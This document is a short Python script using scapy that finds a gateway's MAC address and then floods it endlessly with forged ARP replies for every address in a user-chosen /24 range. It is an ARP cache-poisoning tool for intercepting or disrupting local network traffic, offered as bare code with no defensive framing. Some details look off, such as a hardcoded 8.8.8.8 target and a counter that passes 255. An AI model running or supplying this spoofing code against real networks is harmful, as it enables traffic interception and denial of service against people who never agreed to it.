from scapy.all import Ether, srp, ARP, send
        
def getMac(ip):
    # sr is send and receive at L3, srp is send and receive at L2
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

gatewayip = input("gateway : ")
print("8.8.8.8/24 -> 8.8.8.")
targetip = input("network : ")
gatewaymac = getMac(gatewayip)
i = 0
while (True):
    ip = targetip + str(i)
    send(ARP(op=2, psrc=ip, pdst="8.8.8.8", hwdst=gatewaymac), verbose=0)
    if (i > 255):
        i = 0
    i += 1
